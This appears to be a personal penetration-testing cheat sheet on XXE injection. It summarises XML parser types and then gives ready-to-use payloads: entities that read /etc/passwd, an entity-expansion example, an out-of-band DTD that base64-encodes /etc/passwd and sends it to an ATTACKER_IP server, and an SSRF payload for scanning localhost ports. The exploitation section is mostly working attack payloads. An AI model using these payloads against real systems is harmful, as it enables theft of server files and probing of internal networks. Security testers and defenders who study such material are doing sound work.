#XXE #XML #WebInjection
# Common XML Parsers

Several XML parsers are used across different programming environments; each parser may handle XML data differently, which can affect vulnerability to XXE injection.

- **DOM (Document Object Model) Parser**: This method builds the entire XML document into a memory-based tree structure, allowing random access to all parts of the document. It is resource-intensive but very flexible.
- **SAX (Simple API for XML) Parser**: Parses XML data sequentially without loading the whole document into memory, making it suitable for large XML files. However, it is less flexible for accessing XML data randomly.
- **StAX (Streaming API for XML) Parser**: Similar to SAX, StAX parses XML documents in a streaming fashion but gives the programmer more control over the XML parsing process.
- **XPath Parser**: Parses an XML document based on expression and is used extensively in conjunction with XSLT.

---
# Exploitation

## In-Band XXE 

#### External Entity Reference

If the application *returns the value of a parameter*, we can inject an entity that is pointing to `/etc/passwd` to disclose its values.

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

#### XML Entity Expansion

XML Entity Expansion is a technique where attackers can create recursive or excessively large entities, leading to a ***Denial of Service (DoS)*** attack or defining external entities referencing sensitive files or services. This method is **central to both *in-band* and *out-of-band* XXE**.

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "This is a test message" >]>
<contact>
<name>&xxe; &xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

## Out-of-Band XXE 

- For this attack pull up a server ( `python3 -m http.server 8001`) for HTTP exfiltration.

- Test with :
```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:8001/" >]>
<upload><file>&xxe;</file></upload>
```

- If test is conclusive, create a *DTD file* that contains an external entity with a PHP filter to exfiltrate data from the target web application.
- Example for `exploit.dtd`:
```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:8001/?data=%cmd;'>">
%oobxxe;
```

- Then **exploit with**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:8001/exploit.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```

##  SSRF + XXE #SSRF

Can be used to scan internal networks, access restricted endpoints, or interact with services that are only accessible from the server’s local network.
Here we imagine that *name field is reflected*.

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```

---
# Tools

[[(3) XXE Injection - Tools|Tools]]